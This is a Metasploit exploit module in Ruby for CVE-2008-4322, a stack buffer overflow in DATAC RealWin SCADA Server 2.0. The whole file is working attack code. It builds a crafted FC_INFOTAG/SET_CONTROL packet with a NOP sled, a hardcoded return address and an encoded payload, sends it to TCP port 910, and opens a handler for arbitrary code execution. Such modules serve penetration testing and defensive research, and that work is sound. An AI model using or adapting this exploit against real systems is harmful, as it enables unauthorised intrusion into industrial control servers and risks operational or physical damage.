##
# $Id: realwin.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'DATAC RealWin SCADA Server Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in DATAC Control
				International RealWin SCADA Server 2.0 (Build 6.0.10.37).
				By sending a specially crafted FC_INFOTAG/SET_CONTROL packet,
				an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2008-4322' ],
					[ 'OSVDB', '48606' ],
					[ 'BID', '31418' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Universal', { 'Offset' => 740, 'Ret' => 0x4001e2a9 } ], # Thanks Jacopo!
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Sep 26 2008'))

		register_options([Opt::RPORT(910)], self.class)
	end

	def exploit
		connect

		data =  [0x67542310].pack('V')
		data << [0x00000800].pack('V')
		data << [0x000a77e3].pack('V')
		data << [0x00040005].pack('V')
		data << "\x00\x00"
		data << make_nops(target['Offset'])
		data << [target.ret].pack('V')
		data << [0x00404040].pack('V')
		data << payload.encoded
		data << make_nops(1024)

		print_status("Trying target #{target.name}...")
		sock.get_once
		sock.put(data)

		handler
		disconnect
	end

end
